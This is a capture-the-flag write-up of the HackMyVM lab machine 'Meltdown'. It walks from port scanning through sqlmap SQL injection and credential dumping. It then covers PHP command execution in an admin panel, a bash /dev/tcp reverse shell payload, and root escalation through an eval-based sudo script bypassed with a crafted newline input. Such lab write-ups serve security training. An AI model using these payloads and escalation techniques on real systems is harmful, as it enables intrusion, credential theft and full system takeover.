# Meltdown

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Meltdown | kaada | Beginner | HackMyVM |

**Summary:** This machine showcases a complete attack path through SQL injection for credential discovery, remote code execution via an admin panel, and privilege escalation through a vulnerable bash script. The attack chain progresses from web reconnaissance to root access through systematic enumeration and exploitation.

---

## Reconnaissance

### Network Discovery

Starting with network reconnaissance to identify the target system:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
...
[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.30 08:00:27:73:AF:87 VirtualBox
```

### Port Scanning

Comprehensive port scan revealed two open services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/meltdown]
└─$ nmap -sCV -p- 192.168.100.30
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: \xE7\x82\x89\xE5\xBF\x83\xE8\x9E\x8D\xE8\xA7\xA3
|_http-server-header: Apache/2.4.62 (Debian)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan revealed SSH on port 22 and Apache HTTP server on port 80 running on Debian Linux.

### Web Application Enumeration

Directory and file enumeration using feroxbuster:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/meltdown]
└─$ feroxbuster -u http://192.168.100.30/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,bak,zip,gif -t 50

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.30/
 🚩  In-Scope Url          │ 192.168.100.30
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, bak, zip, gif]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       72l      364w     4847c http://192.168.100.30/index.php
200      GET      268l      546w     7488c http://192.168.100.30/login.php
200      GET        9l       64w      477c http://192.168.100.30/item.php
200      GET       72l      364w     4847c http://192.168.100.30/
302      GET        0l        0w        0c http://192.168.100.30/logout.php => index.php
200      GET        1l        0w        1c http://192.168.100.30/config.php
```

Key endpoints discovered: `index.php`, `login.php`, `item.php`, and `config.php`.

---

## Initial Access

### Web Application Analysis

#### Index Page Investigation

Accessing the main index page revealed a Vocaloid-themed application with Chinese text:

![](image.png)

The page displays "炉心融解" (The core of the furnace melts) and shows a list of items including characters like "Hatsune Miku", "Kagamine Rin", and "Kagamine Ren". A login prompt indicates authentication is required for additional features.

#### Login Page Examination

The login page requires credentials to access the system:

![](image-1.png)

The login form shows username and password fields with Chinese text, indicating a need to discover valid credentials through other means.

#### SQL Injection Discovery

Testing the `item.php` endpoint without parameters showed an error:

![](image-2.png)

The error message "Warning: Undefined array key 'id'" suggested the presence of an `id` parameter. Testing `item.php?id=1` revealed item details:

![](image-3.png)

The page shows an item description with both Chinese and English text: "This is an item about the melting of the furnace core."

#### Vulnerability Confirmation

Testing for SQL injection by adding a single quote to the URL (`item.php?id=1'`) triggered a SQL error:

![](image-4.png)

The MySQL error confirmed the presence of a SQL injection vulnerability in the `id` parameter.

### SQL Injection Exploitation

Using sqlmap to exploit the SQL injection vulnerability:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/meltdown]
└─$ sqlmap -u "http://192.168.100.30/item.php?id=1" --dbs
...
[13:48:47] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3386=3386

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1 AND GTID_SUBSET(CONCAT(0x7162707171,(SELECT (ELT(9486=9486,1))),0x7178767071),9486)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4762 FROM (SELECT(SLEEP(5)))Yubj)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-2626 UNION ALL SELECT NULL,CONCAT(0x7162707171,0x784d7248694a484a504e574d544e626c56667578656e514c6c6d58644c6a65464c52755253597379,0x7178767071),NULL-- -
---
[13:48:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62, PHP
back-end DBMS: MySQL >= 5.6
[13:48:50] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] target
...
```

#### Database Enumeration

Examining the `target` database and `users` table:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/meltdown]
└─$ sqlmap -u "http://192.168.100.30/item.php?id=1" -D target -T users --columns
...
[13:49:57] [INFO] resuming back-end DBMS 'mysql'
[13:49:57] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=aq7426p093f...7v3ebc7113'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3386=3386

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1 AND GTID_SUBSET(CONCAT(0x7162707171,(SELECT (ELT(9486=9486,1))),0x7178767071),9486)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4762 FROM (SELECT(SLEEP(5)))Yubj)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-2626 UNION ALL SELECT NULL,CONCAT(0x7162707171,0x784d7248694a484a504e574d544e626c56667578656e514c6c6d58644c6a65464c52755253597379,0x7178767071),NULL-- -
---
[13:49:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP, Apache 2.4.62
back-end DBMS: MySQL >= 5.6
[13:49:59] [INFO] fetching columns for table 'users' in database 'target'
Database: target
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+
...
```

#### Credential Extraction

Dumping credentials from the users table:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/meltdown]
└─$ sqlmap -u "http://192.168.100.30/item.php?id=1" -D target -T users -C "username,password" --dump
...
[13:50:22] [INFO] resuming back-end DBMS 'mysql'
[13:50:22] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=7nm93rb4ro4...omvsvmcbna'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3386=3386

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1 AND GTID_SUBSET(CONCAT(0x7162707171,(SELECT (ELT(9486=9486,1))),0x7178767071),9486)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4762 FROM (SELECT(SLEEP(5)))Yubj)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-2626 UNION ALL SELECT NULL,CONCAT(0x7162707171,0x784d7248694a484a504e574d544e626c56667578656e514c6c6d58644c6a65464c52755253597379,0x7178767071),NULL-- -
---
[13:50:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62, PHP
back-end DBMS: MySQL >= 5.6
[13:50:23] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'target'
Database: target
Table: users
[1 entry]
+----------+----------+
| username | password |
+----------+----------+
| rin      |[REDACTED]|
+----------+----------+
...
```

Successfully obtained credentials: `rin:[REDACTED]`

### Authentication Bypass

Using the extracted credentials to login:

![](image-5.png)

Successful authentication revealed a welcome message and access to a new endpoint: "Item Introduction Management Panel" at `/rin_profile.php`.

---

## Remote Code Execution

### Admin Panel Analysis

Accessing the admin panel revealed an item description management interface:

![](image-6.png)

The panel allows editing item descriptions with a text area, suggesting potential for command execution. Let's test it using `echo system('id');`

### RCE Vulnerability Testing

Testing command execution by updating the description field and observing the results:

![](image-7.png)

The output shows `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, confirming successful remote code execution as the www-data user.

### Reverse Shell Establishment

Injecting a reverse shell payload through the admin panel:

![](image-8.png)

The payload `system("bash -c "bash -i > & /dev/tcp/192.168.100.1/4444 0> &1");` was successfully injected into the item description.

Setting up a netcat listener:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/meltdown]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

Triggering the payload by refreshing `http://192.168.100.30/item.php?id=1` established the reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/meltdown]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 61029
bash: cannot set terminal process group (427): Inappropriate ioctl for device
bash: no job control in this shell
www-data@meltdown:/var/www/html$
```

---

## Privilege Escalation

### Internal Enumeration

Searching for password files and credentials:

```bash
www-data@meltdown:/var/www/html$ find /opt /var -type f -name "*pass*" 2>/dev/null
/opt/passwd.txt
/var/backups/passwd.bak
/var/lib/dpkg/info/base-passwd.md5sums
/var/lib/dpkg/info/passwd.postinst
/var/lib/dpkg/info/base-passwd.postrm
/var/lib/dpkg/info/passwd.preinst
/var/lib/dpkg/info/base-passwd.list
/var/lib/dpkg/info/base-passwd.postinst
/var/lib/dpkg/info/base-passwd.preinst
/var/lib/dpkg/info/passwd.conffiles
/var/lib/dpkg/info/base-passwd.templates
/var/lib/dpkg/info/passwd.md5sums
/var/lib/dpkg/info/passwd.list
/var/lib/pam/password
/var/cache/debconf/passwords.dat
www-data@meltdown:/var/www/html$ cat /opt/passwd.txt
rin:[REDACTED]
```

### SSH Access

Using the discovered credentials to SSH as rin:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/meltdown]
└─$ ssh rin@192.168.100.30
...
rin@meltdown:~$ id
uid=1000(rin) gid=1000(rin) groups=1000(rin)
```

### Sudo Privileges Analysis

Checking sudo permissions:

```bash
rin@meltdown:~$ sudo -l
Matching Defaults entries for rin on meltdown:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rin may run the following commands on meltdown:
    (root) NOPASSWD: /opt/repeater.sh
```

### Vulnerable Script Examination

Analyzing the sudo-accessible script:

```bash
rin@meltdown:~$ cat /opt/repeater.sh
#!/bin/bash

main() {
    local user_input="$1"

    if echo "$user_input" | grep -qE '[;&|`$\\]'; then
        echo "错误：输入包含非法字符"
        return 1
    fi

    if echo "$user_input" | grep -qiE '(cat|ls|echo|rm|mv|cp|chmod)'; then
        echo "错误：输入包含危险关键字"
        return 1
    fi


    if echo "$user_input" | grep -qE '[[:space:]]'; then
        if ! echo "$user_input" | grep -qE '^[a-zA-Z0-9]*[[:space:]]+[a-zA-Z0-9]*$'; then
            echo "错误：空格使用受限"
            return 1
        fi
    fi


    echo "处理结果: $user_input"


    local sanitized_input=$(echo "$user_input" | tr -d '\n\r')
    eval "output=\"$sanitized_input\""
    echo "最终输出: $output"
}

if [ $# -ne 1 ]; then
    echo "用法: $0 <输入内容>"
    exit 1
fi

main "$1"
```

The script contains multiple input validation checks but has a critical vulnerability in the `eval` statement that can be exploited.

### Root Privilege Escalation

Exploiting the bash script using a carefully crafted payload that bypasses the filtering:

```bash
rin@meltdown:~$ sudo /opt/repeater.sh $'a" /bin/bash # \nb c'
处理结果: a" /bin/bash #
b c
root@meltdown:/home/rin# id
uid=0(root) gid=0(root) groups=0(root)
```

### Flag Capture

Retrieving both user and root flags:

```bash
root@meltdown:/home/rin# cat /root/root.txt /home/rin/user.txt
[REDACTED]
[REDACTED]
```

---

## Attack Chain Summary

1. **Reconnaissance**: Network scan identified target 192.168.100.30 with SSH (22) and HTTP (80) services
2. **Vulnerability Discovery**: Found SQL injection in `item.php?id` parameter through error-based testing
3. **Exploitation**: Used sqlmap to extract credentials (rin:[REDACTED]) from target database
4. **Authentication Bypass**: Accessed admin panel at rin_profile.php using extracted credentials
5. **Remote Code Execution**: Exploited RCE vulnerability in item description update functionality
6. **Internal Enumeration**: Found SSH credentials (rin:[REDACTED]) in /opt/passwd.txt
7. **Privilege Escalation**: Exploited vulnerable bash script /opt/repeater.sh via sudo to gain root access